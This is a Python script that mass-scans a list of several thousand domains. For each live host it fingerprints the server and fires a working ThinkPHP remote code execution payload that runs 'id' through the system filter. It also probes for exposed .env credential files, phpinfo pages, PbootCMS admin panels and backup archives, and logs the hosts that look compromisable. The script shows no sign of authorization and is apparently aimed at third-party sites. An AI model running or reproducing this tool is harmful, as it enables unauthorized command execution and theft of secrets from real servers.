import subprocess, json, re, time
from datetime import datetime

ALL = "/tmp/all_4719_domains.txt"
SCANNED = "/tmp/scanned_domains.txt"
OUTPUT = "/tmp/phase2_scan_results.json"
LOG = "/tmp/phase2_scan.log"

def log(msg):
    ts = datetime.now().strftime("%H:%M:%S")
    line = f"[{ts}] {msg}"
    with open(LOG, "a") as f: f.write(line + "\n")

def curl(url, timeout=8):
    cmd = ["curl", "-sk", "--connect-timeout", "5", "--max-time", str(timeout),
           "-o", "/tmp/body.tmp", "-D", "/tmp/hdr.tmp", "-w", "%{http_code}", url]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+5)
        code = r.stdout.strip()
        try:
            with open("/tmp/hdr.tmp") as f: hdrs = f.read()
        except: hdrs = ""
        try:
            with open("/tmp/body.tmp") as f: body = f.read(2000)
        except: body = ""
        return code, body, hdrs
    except:
        return "000", "", ""

def scan(domain):
    info = {"alive": False, "hits": []}
    code, body, hdrs = curl(f"http://{domain}/")
    if code in ["000",""]:
        return info
    info["alive"] = True
    info["code"] = code
    
    # Headers
    for line in hdrs.split("\n"):
        l = line.strip().lower()
        if l.startswith("server:"): info["server"] = l[7:].strip()[:100]
        if l.startswith("x-powered-by:"): info["powered"] = l[14:].strip()[:100]
    
    # Title
    m = re.search(r"<title>([^<]*)</title>", body, re.I)
    if m: info["title"] = m.group(1)[:200]
    
    powered = info.get("powered","").lower()
    
    # ThinkPHP RCE
    if "thinkphp" in powered:
        rce_code, rce_body, _ = curl(f"http://{domain}/index.php?s=captcha&_method=__construct&filter=system&method=get&server[REQUEST_METHOD]=id", 6)
        if "uid=" in rce_body:
            info["hits"].append({"type":"ThinkPHP_RCE","evidence":rce_body[:200]})
            log(f"  [!] THINKPHP RCE: {domain}")
        info["cms"] = "ThinkPHP"
    
    # PbootCMS
    if "pboot" in powered:
        info["cms"] = "PbootCMS"
        code2, body2, _ = curl(f"http://{domain}/admin.php")
        if code2 in ["200","302"]:
            info["hits"].append({"type":"PbootCMS_admin"})
    
    # .env leak
    code2, body2, _ = curl(f"http://{domain}/.env", 5)
    if code2 == "200" and len(body2) > 10:
        if re.search(r"DB_|APP_KEY|MAIL_", body2, re.I):
            info["hits"].append({"type":"env_leak"})
            log(f"  [!] .ENV: {domain}")
    
    # phpinfo
    code3, body3, _ = curl(f"http://{domain}/phpinfo.php", 5)
    if code3 == "200" and "PHP Version" in body3:
        info["hits"].append({"type":"phpinfo"})
        log(f"  [!] PHPINFO: {domain}")
    
    # backup
    code4, _, _ = curl(f"http://{domain}/backup.zip", 5)
    if code4 == "200":
        info["hits"].append({"type":"backup_zip"})
    
    return info

# Main
log("FULL PHASE2 START - 4322 domains")
with open(ALL) as f: all_d = set(l.strip() for l in f if l.strip())
with open(SCANNED) as f: scanned = set(l.strip() for l in f if l.strip())
remaining = list(all_d - scanned)
log(f"Remaining: {len(remaining)}")

try:
    with open(OUTPUT) as f: results = json.load(f)
except:
    results = {}

batch = 0
for i, d in enumerate(remaining):
    if d in results: continue
    info = scan(d)
    results[d] = info
    batch += 1
    if batch % 100 == 0:
        alive = sum(1 for v in results.values() if v.get("alive"))
        hits = sum(1 for v in results.values() if len(v.get("hits",[])) > 0)
        log(f"Progress: {len(results)} | Alive: {alive} | Hits: {hits}")
        with open(OUTPUT, "w") as f: json.dump(results, f, ensure_ascii=False)

with open(OUTPUT, "w") as f: json.dump(results, f, ensure_ascii=False)
alive = sum(1 for v in results.values() if v.get("alive"))
hits = sum(1 for v in results.values() if len(v.get("hits",[])) > 0)
log(f"DONE: {len(results)} scanned | Alive: {alive} | Hits: {hits}")
